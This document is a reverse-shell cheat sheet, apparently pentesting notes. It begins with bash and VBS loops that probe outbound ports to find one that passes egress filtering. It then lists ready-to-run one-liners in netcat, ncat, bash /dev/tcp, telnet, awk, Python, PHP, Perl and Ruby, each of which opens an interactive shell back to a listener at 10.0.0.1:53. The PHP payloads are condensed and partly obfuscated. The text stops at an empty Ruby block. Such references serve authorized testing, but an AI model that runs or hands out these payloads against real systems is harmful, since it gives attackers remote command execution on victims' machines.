==============
Reverse Shells
==============

* https://github.com/mthbernardes/rsg
* https://github.com/m0rph-1/revshellgen

Finding a Port
--------------

Try common ports first, 53, 80, etc. However if you are having trouble finding a good port, fire up Wireshark and enter the following filter:

.. code-block:: none

    ip.addr == <target-ip> and tcp.flags.syn == 1

Target IP should be the IP of the host you are trying to connect from. Warning: if this host is coming from a different network, it might be different to what ifconfig says.

On target host, run the following:

.. code-block:: bash

    for port in 80 23 443 21 22 25 3389 110 445 139 143 53 135 3306 8080 1723 111 995 993 5900 1025 587 8888 199 1720 465 548 113 81 6001 10000 514 5060 179 1026 2000 8443 8000 32768 554 26 1433 49152 2001 515 8008 49154 1027 5666 646 5000 5631 631 49153 8081 2049 88 79 5800 106 2121 1110 49155 6000 513 990 5357 427 49156 543 544 5101 144 7 389 8009 3128 444 9999 5009 7070 5190 3000 5432 1900 3986 13 1029 9 5051 6646 49157 1028 873 1755 2717 4899 9100 119 37 1000 3001 5001 82 10010 1030 9090 2107 1024 2103 6004 1801 5050 19 8031 1041 255 1049 1048 2967 1053 3703 1056 1065 1064 1054 17 808 3689 1031 1044 1071 5901 100 9102 8010 2869 1039 5120 4001 9000 2105 636 1038 2601 1 7000 1066 1069 625 311 280 254 4000 1761 5003 2002 2005 1998 1032 1050 6112 3690 1521 2161 6002 1080 2401 4045 902 7937 787 1058 2383 32771 1033 1040 1059 50000 5555 10001 1494 593 2301 3 3268 7938 1234 1022 1074 8002 1036 1035 9001 1037 464 497 1935 6666 2003 6543 1352 24 3269 1111 407 500 20 2006 3260 15000 1218 1034 4444 264 2004 33 1042 42510 999 3052 1023 1068 222 7100 888 563 1717 2008 992 32770 32772 7001 8082 2007 5550 2009 5801 1043 512 2701 7019 50001 1700 4662 2065 2010 42 9535 2602 3333 161 5100 5002 2604 4002 6059 1047 8192 8193 2702 6789 9595 1051 9594 9593 16993 16992 5226 5225 32769 3283 1052 8194 1055 1062 9415 8701 8652 8651 8089 65389 65000 64680 64623 55600 55555 52869 35500 33354 23502 20828 1311 1060 4443 389 1067 13782 5902 366 9050 1002 85 5500 5431 1864 1863 8085 51103 49999 45100 10243 49 6667 90 27000 1503 6881 1500 8021 340 5566 8088 2222 9071 8899 6005 9876 1501 5102 32774 32773 9101 5679 163 648 146 1666 901 83 9207 8001 8083 5004 3476 8084 5214 14238 12345 912 30 2605 2030 6 541 8007 3005 4 1248 2500 880 306 4242 1097 9009 2525 1086 1088 8291 52822 6101 900 7200 2809 800 32775 12000 1083 211 987 705 20005 711 13783 6969 3071 5269 5222 1085 1046 5987 5989 5988 2190 11967 8600 3766 7627 8087 30000 9010 7741 14000 3367 1099 1098 3031 2718 6580 15002 4129 6901 3827 3580 2144 9900 8181 3801 1718 2811 9080 2135 1045 2399 3017 10002 1148 9002 8873 2875 5718 8086 3998 2607 11110 4126 5911 5910 9618 2381 1096 3300 3351 1073 8333 3784 5633 15660 6123 3211 1078 3659 3551 2260 2160 2100 16001 3325 3323 1104 9968 9503 9502 9485 9290 9220 9011 8994 8649 8222 7911 7625 7106 65129 63331 6156 6129 60020 5962 5961 5960 5959 5925 5877 5825 5810 58080 57294 50800 50006 50003 49160 49159 49158 48080 40193 34573 34572 34571 3404 33899 3301 32782 32781 31038 30718 28201 27715 25734 24800 22939 21571 20221 20031 19842 19801 19101 17988 1783 16018 16016 15003 14442 13456 10629 10628 10626 10621 10617 10616 10566 10025 10024 10012 1169 5030 5414 1057 6788 1947 1094 1075 1108 4003 1081 1093 4449 1687 1840 1100 1063 1061 1107 1106 9500 20222 7778 1077 1310 2119 2492 1070 20000 8400 1272 6389 7777 1072 1079 1082 8402 89 691 1001 32776 1999 212 2020 6003 7002 2998 50002 3372 898 5510 32 2033 5903 99 749 425 43 5405 6106 13722 6502 7007 458 9666 8100 3737 5298 1152 8090 2191 3011 1580 5200 3851 3371 3370 3369 7402 5054 3918 3077 7443 3493 3828 1186 2179 1183 19315 19283 3995 5963 1124 8500 1089 10004 2251 1087 5280 3871 3030 62078 9091 4111 1334 3261 2522 5859 1247 9944 9943 9877 9110 8654 8254 8180 8011 7512 7435 7103 61900 61532 5922 5915 5904 5822 56738 55055 51493 50636 50389 49175 49165 49163 3546 32784 27355 27353 27352 24444 19780 18988 16012 15742 10778 4006 2126 4446 3880 1782 1296 9998 9040 32779 1021 32777 2021 32778 616 666 700 5802 4321 545 1524 1112 49400 84 38292 2040 32780 3006 2111 1084 1600 2048 2638 6699 9111 16080 6547 6007 1533 5560 2106 1443 667 720 2034 555 801 6025 3221 3826 9200 2608 4279 7025 11111 3527 1151 8200 8300 6689 9878 10009 8800 5730 2394 2393 2725 5061 6566 9081 5678 3800 4550 5080 1201 3168 3814 1862 1114 6510 3905 8383 3914 3971 3809 5033 7676 3517 4900 3869 9418 2909 3878 8042 1091 1090 3920 6567 1138 3945 1175 10003 3390 3889 1131 8292 5087 1119 1117 4848 7800 16000 3324 3322 5221 4445 9917 9575 9099 9003 8290 8099 8093 8045 7921 7920 7496 6839 6792 6779 6692 6565 60443 5952 5950 5907 5906 5862 5850 5815 5811 57797 56737 5544 55056 5440 54328 54045 52848 52673 50500 50300 49176 49167 49161 44501 44176 41511 40911 32785 32783 30951 27356 26214 25735 19350 18101 18040 17877 16113 15004 14441 12265 12174 10215 10180 4567 6100 4004 4005 8022 9898 7999 1271 1199 3003 1122 2323 4224 2022 617 777 417 714 6346 981 722 1009 4998 70 1076 5999 10082 765 301 524 668 2041 6009 1417 1434 259 44443 1984 2068 7004 1007 4343 416 2038 6006 109 4125 1461 9103 911 726 1010 2046 2035 7201 687 2013 481 125 6669 6668 903 1455 683 1011 2043 2047 31337 256 9929 5998 406 44442 783 843 2042 2045 4040 6060 6051 1145 3916 9443 9444 1875 7272 4252 4200 7024 1556 13724 1141 1233 8765 1137 3963 5938 9191 3808 8686 3981 2710 3852 3849 3944 3853 9988 1163 4164 3820 6481 3731 5081 40000 8097 4555 3863 1287 4430 7744 1812 7913 1166 1164 1165 8019 10160 4658 7878 3304 3307 1259 1092 7278 3872 10008 7725 3410 1971 3697 3859 3514 4949 4147 7900 5353; do wget -O /dev/null -T1 -t1 http://10.0.0.1:$port; done

This will iterate over the top TCP ports in order (according to Nmap) and try to make an HTTP connection on each one. Look for a SYN packet in Wireshark, which will indicate that at the very least, the packet made it through.

A smaller, similar (but not as good) script is below. This will iterate across the first 1024 TCP ports, rather than the most popular.

.. code-block:: bash

    for port in $(seq 1 1024); do wget -O /dev/null -T1 -t1 http://10.0.0.1:$port; done

Same thing for Windows (VBS script):

.. code-block:: none

    On Error Resume Next
    arr = Array(80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389,8009,3128,444,9999,5009,7070,5190,3000,5432,1900,3986,13,1029,9,5051,6646,49157,1028,873,1755,2717,4899,9100,119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,5050,19,8031,1041,255,1049,1048,2967,1053,3703,1056,1065,1064,1054,17,808,3689,1031,1044,1071,5901,100,9102,8010,2869,1039,5120,4001,9000,2105,636,1038,2601,1,7000,1066,1069,625,311,280,254,4000,1761,5003,2002,2005,1998,1032,1050,6112,3690,1521,2161,6002,1080,2401,4045,902,7937,787,1058,2383,32771,1033,1040,1059,50000,5555,10001,1494,593,2301,3,3268,7938,1234,1022,1074,8002,1036,1035,9001,1037,464,497,1935,6666,2003,6543,1352,24,3269,1111,407,500,20,2006,3260,15000,1218,1034,4444,264,2004,33,1042,42510,999,3052,1023,1068,222,7100,888,563,1717,2008,992,32770,32772,7001,8082,2007,5550,2009,5801,1043,512,2701,7019,50001,1700,4662,2065,2010,42,9535,2602,3333,161,5100,5002,2604,4002,6059,1047,8192,8193,2702,6789,9595,1051,9594,9593,16993,16992,5226,5225,32769,3283,1052,8194,1055,1062,9415,8701,8652,8651,8089,65389,65000,64680,64623,55600,55555,52869,35500,33354,23502,20828,1311,1060,4443,389,1067,13782,5902,366,9050,1002,85,5500,5431,1864,1863,8085,51103,49999,45100,10243,49,6667,90,27000,1503,6881,1500,8021,340,5566,8088,2222,9071,8899,6005,9876,1501,5102,32774,32773,9101,5679,163,648,146,1666,901,83,9207,8001,8083,5004,3476,8084,5214,14238,12345,912,30,2605,2030,6,541,8007,3005,4,1248,2500,880,306,4242,1097,9009,2525,1086,1088,8291,52822,6101,900,7200,2809,800,32775,12000,1083,211,987,705,20005,711,13783,6969,3071,5269,5222,1085,1046,5987,5989,5988,2190,11967,8600,3766,7627,8087,30000,9010,7741,14000,3367,1099,1098,3031,2718,6580,15002,4129,6901,3827,3580,2144,9900,8181,3801,1718,2811,9080,2135,1045,2399,3017,10002,1148,9002,8873,2875,5718,8086,3998,2607,11110,4126,5911,5910,9618,2381,1096,3300,3351,1073,8333,3784,5633,15660,6123,3211,1078,3659,3551,2260,2160,2100,16001,3325,3323,1104,9968,9503,9502,9485,9290,9220,9011,8994,8649,8222,7911,7625,7106,65129,63331,6156,6129,60020,5962,5961,5960,5959,5925,5877,5825,5810,58080,57294,50800,50006,50003,49160,49159,49158,48080,40193,34573,34572,34571,3404,33899,3301,32782,32781,31038,30718,28201,27715,25734,24800,22939,21571,20221,20031,19842,19801,19101,17988,1783,16018,16016,15003,14442,13456,10629,10628,10626,10621,10617,10616,10566,10025,10024,10012,1169,5030,5414,1057,6788,1947,1094,1075,1108,4003,1081,1093,4449,1687,1840,1100,1063,1061,1107,1106,9500,20222,7778,1077,1310,2119,2492,1070,20000,8400,1272,6389,7777,1072,1079,1082,8402,89,691,1001,32776,1999,212,2020,6003,7002,2998,50002,3372,898,5510,32,2033,5903,99,749,425,43,5405,6106,13722,6502,7007,458,9666,8100,3737,5298,1152,8090,2191,3011,1580,5200,3851,3371,3370,3369,7402,5054,3918,3077,7443,3493,3828,1186,2179,1183,19315,19283,3995,5963,1124,8500,1089,10004,2251,1087,5280,3871,3030,62078,9091,4111,1334,3261,2522,5859,1247,9944,9943,9877,9110,8654,8254,8180,8011,7512,7435,7103,61900,61532,5922,5915,5904,5822,56738,55055,51493,50636,50389,49175,49165,49163,3546,32784,27355,27353,27352,24444,19780,18988,16012,15742,10778,4006,2126,4446,3880,1782,1296,9998,9040,32779,1021,32777,2021,32778,616,666,700,5802,4321,545,1524,1112,49400,84,38292,2040,32780,3006,2111,1084,1600,2048,2638,6699,9111,16080,6547,6007,1533,5560,2106,1443,667,720,2034,555,801,6025,3221,3826,9200,2608,4279,7025,11111,3527,1151,8200,8300,6689,9878,10009,8800,5730,2394,2393,2725,5061,6566,9081,5678,3800,4550,5080,1201,3168,3814,1862,1114,6510,3905,8383,3914,3971,3809,5033,7676,3517,4900,3869,9418,2909,3878,8042,1091,1090,3920,6567,1138,3945,1175,10003,3390,3889,1131,8292,5087,1119,1117,4848,7800,16000,3324,3322,5221,4445,9917,9575,9099,9003,8290,8099,8093,8045,7921,7920,7496,6839,6792,6779,6692,6565,60443,5952,5950,5907,5906,5862,5850,5815,5811,57797,56737,5544,55056,5440,54328,54045,52848,52673,50500,50300,49176,49167,49161,44501,44176,41511,40911,32785,32783,30951,27356,26214,25735,19350,18101,18040,17877,16113,15004,14441,12265,12174,10215,10180,4567,6100,4004,4005,8022,9898,7999,1271,1199,3003,1122,2323,4224,2022,617,777,417,714,6346,981,722,1009,4998,70,1076,5999,10082,765,301,524,668,2041,6009,1417,1434,259,44443,1984,2068,7004,1007,4343,416,2038,6006,109,4125,1461,9103,911,726,1010,2046,2035,7201,687,2013,481,125,6669,6668,903,1455,683,1011,2043,2047,31337,256,9929,5998,406,44442,783,843,2042,2045,4040,6060,6051,1145,3916,9443,9444,1875,7272,4252,4200,7024,1556,13724,1141,1233,8765,1137,3963,5938,9191,3808,8686,3981,2710,3852,3849,3944,3853,9988,1163,4164,3820,6481,3731,5081,40000,8097,4555,3863,1287,4430,7744,1812,7913,1166,1164,1165,8019,10160,4658,7878,3304,3307,1259,1092,7278,3872,10008,7725,3410,1971,3697,3859,3514,4949,4147,7900,5353)
    For Each port in arr
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.open "GET", "http://10.0.0.1:" & port & "/", False
    objXMLHTTP.send()
    Set objXMLHTTP = Nothing
    Next

As a series of echo statements:

.. code-block:: none

    echo On Error Resume Next >> ports.vbs
    echo arr = Array(80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389,8009,3128,444,9999,5009,7070,5190,3000,5432,1900,3986,13,1029,9,5051,6646,49157,1028,873,1755,2717,4899,9100,119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,5050,19,8031,1041,255,1049,1048,2967,1053,3703,1056,1065,1064,1054,17,808,3689,1031,1044,1071,5901,100,9102,8010,2869,1039,5120,4001,9000,2105,636,1038,2601,1,7000,1066,1069,625,311,280,254,4000,1761,5003,2002,2005,1998,1032,1050,6112,3690,1521,2161,6002,1080,2401,4045,902,7937,787,1058,2383,32771,1033,1040,1059,50000,5555,10001,1494,593,2301,3,3268,7938,1234,1022,1074,8002,1036,1035,9001,1037,464,497,1935,6666,2003,6543,1352,24,3269,1111,407,500,20,2006,3260,15000,1218,1034,4444,264,2004,33,1042,42510,999,3052,1023,1068,222,7100,888,563,1717,2008,992,32770,32772,7001,8082,2007,5550,2009,5801,1043,512,2701,7019,50001,1700,4662,2065,2010,42,9535,2602,3333,161,5100,5002,2604,4002,6059,1047,8192,8193,2702,6789,9595,1051,9594,9593,16993,16992,5226,5225,32769,3283,1052,8194,1055,1062,9415,8701,8652,8651,8089,65389,65000,64680,64623,55600,55555,52869,35500,33354,23502,20828,1311,1060,4443,389,1067,13782,5902,366,9050,1002,85,5500,5431,1864,1863,8085,51103,49999,45100,10243,49,6667,90,27000,1503,6881,1500,8021,340,5566,8088,2222,9071,8899,6005,9876,1501,5102,32774,32773,9101,5679,163,648,146,1666,901,83,9207,8001,8083,5004,3476,8084,5214,14238,12345,912,30,2605,2030,6,541,8007,3005,4,1248,2500,880,306,4242,1097,9009,2525,1086,1088,8291,52822,6101,900,7200,2809,800,32775,12000,1083,211,987,705,20005,711,13783,6969,3071,5269,5222,1085,1046,5987,5989,5988,2190,11967,8600,3766,7627,8087,30000,9010,7741,14000,3367,1099,1098,3031,2718,6580,15002,4129,6901,3827,3580,2144,9900,8181,3801,1718,2811,9080,2135,1045,2399,3017,10002,1148,9002,8873,2875,5718,8086,3998,2607,11110,4126,5911,5910,9618,2381,1096,3300,3351,1073,8333,3784,5633,15660,6123,3211,1078,3659,3551,2260,2160,2100,16001,3325,3323,1104,9968,9503,9502,9485,9290,9220,9011,8994,8649,8222,7911,7625,7106,65129,63331,6156,6129,60020,5962,5961,5960,5959,5925,5877,5825,5810,58080,57294,50800,50006,50003,49160,49159,49158,48080,40193,34573,34572,34571,3404,33899,3301,32782,32781,31038,30718,28201,27715,25734,24800,22939,21571,20221,20031,19842,19801,19101,17988,1783,16018,16016,15003,14442,13456,10629,10628,10626,10621,10617,10616,10566,10025,10024,10012,1169,5030,5414,1057,6788,1947,1094,1075,1108,4003,1081,1093,4449,1687,1840,1100,1063,1061,1107,1106,9500,20222,7778,1077,1310,2119,2492,1070,20000,8400,1272,6389,7777,1072,1079,1082,8402,89,691,1001,32776,1999,212,2020,6003,7002,2998,50002,3372,898,5510,32,2033,5903,99,749,425,43,5405,6106,13722,6502,7007,458,9666,8100,3737,5298,1152,8090,2191,3011,1580,5200,3851,3371,3370,3369,7402,5054,3918,3077,7443,3493,3828,1186,2179,1183,19315,19283,3995,5963,1124,8500,1089,10004,2251,1087,5280,3871,3030,62078,9091,4111,1334,3261,2522,5859,1247,9944,9943,9877,9110,8654,8254,8180,8011,7512,7435,7103,61900,61532,5922,5915,5904,5822,56738,55055,51493,50636,50389,49175,49165,49163,3546,32784,27355,27353,27352,24444,19780,18988,16012,15742,10778,4006,2126,4446,3880,1782,1296,9998,9040,32779,1021,32777,2021,32778,616,666,700,5802,4321,545,1524,1112,49400,84,38292,2040,32780,3006,2111,1084,1600,2048,2638,6699,9111,16080,6547,6007,1533,5560,2106,1443,667,720,2034,555,801,6025,3221,3826,9200,2608,4279,7025,11111,3527,1151,8200,8300,6689,9878,10009,8800,5730,2394,2393,2725,5061,6566,9081,5678,3800,4550,5080,1201,3168,3814,1862,1114,6510,3905,8383,3914,3971,3809,5033,7676,3517,4900,3869,9418,2909,3878,8042,1091,1090,3920,6567,1138,3945,1175,10003,3390,3889,1131,8292,5087,1119,1117,4848,7800,16000,3324,3322,5221,4445,9917,9575,9099,9003,8290,8099,8093,8045,7921,7920,7496,6839,6792,6779,6692,6565,60443,5952,5950,5907,5906,5862,5850,5815,5811,57797,56737,5544,55056,5440,54328,54045,52848,52673,50500,50300,49176,49167,49161,44501,44176,41511,40911,32785,32783,30951,27356,26214,25735,19350,18101,18040,17877,16113,15004,14441,12265,12174,10215,10180,4567,6100,4004,4005,8022,9898,7999,1271,1199,3003,1122,2323,4224,2022,617,777,417,714,6346,981,722,1009,4998,70,1076,5999,10082,765,301,524,668,2041,6009,1417,1434,259,44443,1984,2068,7004,1007,4343,416,2038,6006,109,4125,1461,9103,911,726,1010,2046,2035,7201,687,2013,481,125,6669,6668,903,1455,683,1011,2043,2047,31337,256,9929,5998,406,44442,783,843,2042,2045,4040,6060,6051,1145,3916,9443,9444,1875,7272,4252,4200,7024,1556,13724,1141,1233,8765,1137,3963,5938,9191,3808,8686,3981,2710,3852,3849,3944,3853,9988,1163,4164,3820,6481,3731,5081,40000,8097,4555,3863,1287,4430,7744,1812,7913,1166,1164,1165,8019,10160,4658,7878,3304,3307,1259,1092,7278,3872,10008,7725,3410,1971,3697,3859,3514,4949,4147,7900,5353) >> ports.vbs
    echo For Each port in arr >> ports.vbs
    echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> ports.vbs
    echo objXMLHTTP.open "GET", "http://10.0.0.1:" ^& port ^& "/", False >> ports.vbs
    echo objXMLHTTP.send() >> ports.vbs
    echo Set objXMLHTTP = Nothing >> ports.vbs
    echo Next >> ports.vbs
    echo ""

Netcat
------

.. code-block:: none

    nc -c /bin/sh 10.0.0.1 53

.. code-block:: none

    nc -e /bin/sh 10.0.0.1 53

.. code-block:: none

    /bin/nc.traditional 10.0.0.1 53 -e /bin/sh

Netcat (no -e)
--------------

.. code-block:: bash

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 53 >/tmp/f

.. code-block:: bash

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc.openbsd 10.0.0.1 53 > /tmp/f

.. code-block:: bash

    rm -f /tmp/x; mknod /tmp/x p && nc 10.0.0.1 53 0</tmp/x | /bin/sh 1>/tmp/x

.. code-block:: bash

    rm -f /tmp/x; mknod /tmp/x p && /bin/nc.openbsd 10.0.0.1 53 0</tmp/x | /bin/sh 1>/tmp/x

Ncat
----

.. code-block:: none

    ncat 10.0.0.1 53 -e /bin/sh

.. code-block:: none

    ncat --udp 10.0.0.1 53 -e /bin/sh

Bash TCP
--------

.. code-block:: bash

    sh -i >& /dev/tcp/10.0.0.1/53 0>&1

.. code-block:: bash

    exec 5<> /dev/tcp/10.0.0.1/53; cat <&5 | while read line; do $line 2>&5>&5; done

.. code-block:: bash

    0<&196;exec 196<>/dev/tcp/10.0.0.1/53; sh <&196 >&196 2>&196

Bash UDP
--------

.. code-block:: bash

    sh -i >& /dev/udp/10.0.0.1/53 0>&1

Telnet
------

Create two listeners, the first for sending commands, the other for receiving results.

.. code-block:: bash

    telnet 10.0.0.1 53 | /bin/sh | telnet 10.0.0.1 54

.. code-block:: bash

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 10.0.0.1 53 > /tmp/f

.. code-block:: bash

    rm -f /tmp/x; mknod /tmp/x p && telnet 10.0.0.1 53 0</tmp/x | /bin/sh 1>/tmp/x

Awk
---

.. code-block:: bash

    awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/53"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

Python
------

Linux Only:

.. code-block:: python

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

.. code-block:: python

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Windows Only:

.. code-block:: python

    C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 53)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

PHP
---

.. code-block:: php

    php -r '$s=fsockopen("10.0.0.1",53);exec("/bin/sh -i <&3 >&3 2>&3");'

.. code-block:: php

    php -r '$s=fsockopen("10.0.0.1",53);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

.. code-block:: php

    php -r '$s=fsockopen("10.0.0.1",53);`/bin/sh -i <&3 >&3 2>&3`;'

.. code-block:: php

    php -r '$s=fsockopen("10.0.0.1",53);system("/bin/sh -i <&3 >&3 2>&3");'

.. code-block:: php

    php -r '$s=fsockopen("10.0.0.1",53);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

The following is a one-liner modified from a full `pentestmonkey script <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>`__. It is generally very successful.

.. code-block:: php

    <?php set_time_limit(0);$VERSION="1.0";$ip='10.0.0.1';$port=53;$chunk_size=1400;$write_a=null;$error_a=null;$shell='/bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit("ERROR:cannot-fork");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("Error:cannot-setsid()");exit(1);}$daemon=1;}else{printit("WARNING:failed-to-daemonise");}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit("$errstr($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit("ERROR:cannot-spawn-shell");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("successfully-opened-reverse-shell-to-$ip:$port");while(1){if(feof($sock)){printit("ERROR:shell-connection-terminated");break;}if(feof($pipes[1])){printit("ERROR:shell-process-terminated");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit("SOCK:READ");$input=fread($sock,$chunk_size);if($debug)printit("SOCK:$input");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit("STDOUT:READ");$input=fread($pipes[1],$chunk_size);if($debug)printit("STDOUT:$input");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit("STDERR:READ");$input=fread($pipes[2],$chunk_size);if($debug)printit("STDERR:$input");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print("$string\n");}}?>

The following is a one-liner modified from msfvenom's php/reverse_php script. It tends to not be that reliable.

.. code-block:: php

    <?php @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$dis=@ini_get('disable_functions');if(!empty($dis)){$dis=preg_replace('/[, ]+/',',',$dis);$dis=explode(',',$dis);$dis=array_map('trim',$dis);}else{$dis=array();}$ipaddr='10.0.0.1';$port=53;if(!function_exists('VmlTkWqAWqzABk')){function VmlTkWqAWqzABk($c){global $dis;if(FALSE!==strpos(strtolower(PHP_OS),'win')){$c=$c."2>&1\n";}$bjxQcQ='is_callable';$avuz='in_array';if($bjxQcQ('exec')and!$avuz('exec',$dis)){$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}elseif($bjxQcQ('passthru')and!$avuz('passthru',$dis)){ob_start();passthru($c);$o=ob_get_contents();ob_end_clean();}elseif($bjxQcQ('popen')and!$avuz('popen',$dis)){$fp=popen($c,'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);}elseif($bjxQcQ('system')and!$avuz('system',$dis)){ob_start();system($c);$o=ob_get_contents();ob_end_clean();}elseif($bjxQcQ('proc_open')and!$avuz('proc_open',$dis)){$handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);}@proc_close($handle);}elseif($bjxQcQ('shell_exec')and!$avuz('shell_exec',$dis)){$o=shell_exec($c);}else{$o=0;}return $o;}}$nofuncs='no-exec-functions';if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){$s=@fsockopen("tcp://10.0.0.1",$port);while($c=fread($s,2048)){$out='';if(substr($c,0,3)=='cd '){chdir(substr($c,3,-1));}else if(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){break;}else{$out=VmlTkWqAWqzABk(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs);break;}}fwrite($s,$out);}fclose($s);}else{$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,$ipaddr,$port);@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){$out='';if(substr($c,0,3)=='cd '){chdir(substr($c,3,-1));}else if(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){break;}else{$out=VmlTkWqAWqzABk(substr($c,0,-1));if($out===false){@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out));}@socket_close($s);}

Perl
----

.. code-block:: perl

    perl -e 'use Socket;$i="10.0.0.1";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

.. code-block:: perl

    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:53");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

Windows Only:

.. code-block:: perl

    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:53");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

Ruby
----

.. code-block:: ruby

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",53).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

.. code-block:: ruby

    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","53");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

Windows Only:

.. code-block:: ruby

